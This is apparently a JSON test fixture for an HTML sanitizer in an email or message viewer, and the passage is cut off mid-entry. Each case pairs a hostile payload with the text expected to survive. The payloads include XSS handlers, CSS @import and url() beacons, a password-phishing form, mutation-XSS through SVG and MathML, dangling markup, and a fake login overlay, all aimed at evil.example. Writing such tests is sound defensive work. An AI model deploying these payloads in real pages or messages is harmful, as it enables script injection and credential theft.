[
  {
    "title": "a cid image pointing at another message keeps its reference for the window to resolve",
    "payload": "<img src=\"cid:part1@other-message.example\" onerror=\"top.__x=1\"><script>top.__x=1</script>",
    "keeps": ["src=\"cid:part1@other-message.example\""]
  },
  {
    "title": "a style block with url() and @import exfiltration passes as text for the frame's policy",
    "payload": "<style>@import url(\"https://evil.example/steal.css\"); body { background: url(https://evil.example/pixel?x=1) }</style><p>hi</p><img src=\"x\" onerror=\"top.__x=1\">",
    "keeps": ["@import", "<p>hi</p>"]
  },
  {
    "title": "a font-face rule passes as text for the frame's policy",
    "payload": "<style>@font-face { font-family: x; src: url(https://evil.example/f.woff) }</style><script>top.__x=1</script>",
    "keeps": ["@font-face"]
  },
  {
    "title": "a meta refresh is dropped",
    "payload": "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/\"><script>top.__x=1</script><p>after</p>",
    "keeps": ["<p>after</p>"]
  },
  {
    "title": "a base href is dropped and the relative link with it",
    "payload": "<base href=\"https://evil.example/\"><a href=\"login\" onclick=\"top.__x=1\">Sign in</a>",
    "keeps": ["Sign in"]
  },
  {
    "title": "a phishing form loses its controls and keeps its words",
    "payload": "<form action=\"https://evil.example/steal\" method=\"post\"><label>Password <input type=\"password\" name=\"p\"></label><button onclick=\"top.__x=1\">Sign in</button></form>",
    "keeps": ["Password", "Sign in"]
  },
  {
    "title": "an svg payload is dropped",
    "payload": "<svg><script>top.__x=1</script><a xlink:href=\"javascript:top.__x=1\"><text>x</text></a><image href=\"javascript:top.__x=1\"></svg><p>after</p>",
    "keeps": ["<p>after</p>"]
  },
  {
    "title": "a style inside an svg breaks out of nothing",
    "payload": "<svg><style><img src=\"x\" onerror=\"top.__x=1\"></style></svg><p>after</p>",
    "keeps": ["<p>after</p>"]
  },
  {
    "title": "a math payload with a text integration point is dropped",
    "payload": "<math><mtext><table><mglyph><style><img src=\"x\" onerror=\"top.__x=1\"></style></mglyph></table></mtext></math><math><mi xlink:href=\"data:x,<script>top.__x=1</script>\">x</mi></math><p>after</p>",
    "keeps": ["<p>after</p>"]
  },
  {
    "title": "srcset is dropped and src stays",
    "payload": "<img src=\"https://cdn.example/a.png\" srcset=\"https://evil.example/t.png 1x\" onerror=\"top.__x=1\">",
    "keeps": ["src=\"https://cdn.example/a.png\""]
  },
  {
    "title": "a data:text/html link is dropped",
    "payload": "<a href=\"data:text/html;base64,PHNjcmlwdD50b3AuX194PTE8L3NjcmlwdD4=\">open</a>",
    "keeps": ["open"]
  },
  {
    "title": "dangling markup swallows the rest into a remote image the window keeps blocked",
    "payload": "<img src='https://evil.example/?<p>secret</p><script>top.__x=1</script>",
    "keeps": []
  },
  {
    "title": "a position fixed overlay passes as text for the window to demote",
    "payload": "<div style=\"position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff\">Your session expired. <a href=\"https://evil.example/login\" onclick=\"top.__x=1\">Sign in again</a></div>",
    "keeps": ["position:fixed", "Sign in again"]
  },
  {
    "title": "viewport units pass as text for the window to drop",
    "payload": "<div style=\"height:100vh\"><script>top.__x=1</script>x</div>",
    "keeps": ["height:100vh"]
  },
  {
    "title": "expression and behavior pass as text the frame never runs",
